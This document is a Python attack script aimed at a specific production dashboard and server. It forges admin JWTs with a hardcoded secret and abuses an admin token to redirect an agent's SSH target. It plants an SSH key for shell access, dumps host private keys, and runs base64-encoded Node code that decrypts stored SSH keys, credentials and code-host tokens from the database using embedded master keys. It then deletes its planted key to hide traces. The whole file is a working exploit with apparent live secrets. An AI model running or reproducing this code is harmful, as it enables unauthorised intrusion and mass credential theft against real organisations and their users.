#!/usr/bin/env python3
# i29220 round E (final): capture decrypted DB credential store + host ssh keys
import os, sys, json, time, base64, hmac, hashlib, subprocess
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29220e"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=120):
    args = ["ssh", "-i", KEY, "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes", "-o", "ConnectTimeout=15",
            "-o", "LogLevel=ERROR", "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

R("P0_health", call("/api/health", timeout=20))
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
orig = {}
for a in (j.get("agents", []) if isinstance(j, dict) else []):
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
R("P1_admin", {"code": r["code"], "target": orig})
pr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=1000)
R("P2_patch", {"code": pr["code"]})
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
open("/tmp/authorized_keys2", "w").write(open(KEY + ".pub").read().strip() + "\n")
sess = forge(OWNER)
url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp("/home/ubuntu/.ssh"))
args = ["curl", "-s", "-k", "-m", "60", "--http2", "-A", UA, "-H", "Cookie: session=" + sess,
        "-F", "files=@/tmp/authorized_keys2;filename=authorized_keys2;type=text/plain",
        "-w", "\n__CODE__%{http_code}", url]
rc, out, err = run(args, timeout=80)
R("P4_upload", out.decode("utf-8", "replace")[-160:])
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=1000)
R("P5_restore", {"code": rr["code"]})
rc, out, err = ssh("id; hostname", timeout=40)
R("P6_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:200]})
if b"uid=" not in out:
    print("NO SHELL", flush=True); sys.exit(0)

# E1: host ssh private key files
cmd = ("for f in /home/ubuntu/.ssh/*; do case \"$f\" in *.pub|*known_hosts*|*config*) continue;; esac; "
       "echo \"== $f ==\"; cat \"$f\" 2>/dev/null; echo; done")
rc, out, err = ssh(cmd, timeout=40)
R("E1_hostkeys", out.decode("utf-8", "replace")[:12000])

# E2: DB decrypted ssh keys + hosts + credentials plaintext
node1 = r"""
const fs=require('fs'),crypto=require('crypto');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1].trim();
const MASTERS=['ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938','297b8a491bc1920b918d01de77166556d3f835f473968c6b'];
function derive(m,l){return crypto.createHmac('sha256',m).update(l).digest();}
function openSeal(master,label,sealed){const key=derive(master,label);const iv=sealed.subarray(0,12),tag=sealed.subarray(12,28),ct=sealed.subarray(28);const d=crypto.createDecipheriv('aes-256-gcm',key,iv);d.setAuthTag(tag);return Buffer.concat([d.update(ct),d.final()]);}
function dec(row){for(const m of MASTERS){try{const dek=Buffer.from(openSeal(m,'lumii:ops-kek:v1',row.wrapped_dek).toString('utf8'),'base64');const aad=Buffer.from(JSON.stringify(['lumii:ops-credential:v1',row.org_id,row.id]),'utf8');const c=row.ciphertext;const d=crypto.createDecipheriv('aes-256-gcm',dek,c.subarray(0,12));d.setAAD(aad);d.setAuthTag(c.subarray(12,28));return Buffer.concat([d.update(c.subarray(28)),d.final()]).toString('utf8');}catch(e){}}return null;}
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();const q=async(s)=>{try{return (await c.query(s)).rows;}catch(e){return [{err:String(e.message).slice(0,120)}];}};
const out={};
const k=await q("select id,org_id,name,key_type,public_key,status,ciphertext,wrapped_dek from project_ssh_keys");
out.ssh_keys=k.map(x=>x.err?x:{id:x.id,name:x.name,key_type:x.key_type,pub:x.public_key,priv:dec(x)});
out.hosts=await q("select key_id,alias,host,port,login_user,connect,via_host_id from project_ssh_key_hosts");
const cr=await q("select id,org_id,kind,name,meta,target_hosts,status,ciphertext,wrapped_dek from credentials");
out.creds=cr.map(x=>x.err?x:{id:x.id,kind:x.kind,name:x.name,meta:x.meta,target_hosts:x.target_hosts,plain:dec(x)});
await c.end();console.log(JSON.stringify(out).slice(0,24000));})().catch(e=>console.log('ERR',String(e).slice(0,300)));
"""
b64 = base64.b64encode(node1.encode()).decode()
rc, out, err = ssh("cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pge1.cjs && timeout 80 node /tmp/pge1.cjs" % b64, timeout=110)
R("E2_pg_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:24000], "err": err.decode("utf-8", "replace")[:200]})

# E3: code-host tokens + org models + im creds + project env + users
node2 = r"""
const fs=require('fs'),crypto=require('crypto');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1].trim();
const MASTERS=['ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938','297b8a491bc1920b918d01de77166556d3f835f473968c6b'];
function derive(m,l){return crypto.createHmac('sha256',m).update(l).digest();}
function openSeal(master,label,sealed){const key=derive(master,label);const iv=sealed.subarray(0,12),tag=sealed.subarray(12,28),ct=sealed.subarray(28);const d=crypto.createDecipheriv('aes-256-gcm',key,iv);d.setAuthTag(tag);return Buffer.concat([d.update(ct),d.final()]).toString('utf8');}
function tok(sealed){for(const m of MASTERS){try{return openSeal(m,'lumii:code-host-token:v1',sealed).toString('utf8');}catch(e){}}return null;}
function nb(v){return Buffer.isBuffer(v)?{b64:v.toString('base64'),len:v.length}:(v instanceof Date?v.toISOString():v);}
function nrow(o){const r={};for(const k in o)r[k]=nb(o[k]);return r;}
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();const q=async(s)=>{try{return (await c.query(s)).rows;}catch(e){return [{err:String(e.message).slice(0,120)}];}};
const out={};
const ch=await q("select id,org_id,host,name,auth_kind,account_login,base_url,token_sealed,token_scopes,state from code_host_connections");
out.code_hosts=ch.map(x=>x.err?x:{id:x.id,host:x.host,name:x.name,auth_kind:x.auth_kind,account_login:x.account_login,base_url:x.base_url,state:x.state,scopes:x.token_scopes,token:tok(x.token_sealed)});
for(const t of ['org_models','im_credentials','project_environments','project_env_machines','cloud_identities','users']){
  const rows=await q("select * from "+t+" limit 60");
  out[t]=rows.map(r=>r.err?r:nrow(r));
}
await c.end();console.log(JSON.stringify(out).slice(0,24000));})().catch(e=>console.log('ERR',String(e).slice(0,300)));
"""
b64 = base64.b64encode(node2.encode()).decode()
rc, out, err = ssh("cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pge2.cjs && timeout 80 node /tmp/pge2.cjs" % b64, timeout=110)
R("E3_pg_misc", {"rc": rc, "out": out.decode("utf-8", "replace")[:24000], "err": err.decode("utf-8", "replace")[:200]})

# cleanup
rc, out, err = ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; ls /home/ubuntu/.ssh/authorized_keys2 2>&1 | head -1; echo CLEANED", timeout=30)
R("P9_cleanup", out.decode("utf-8", "replace")[:300])
R("P99_done", "roundE complete")
print("DONE", flush=True)
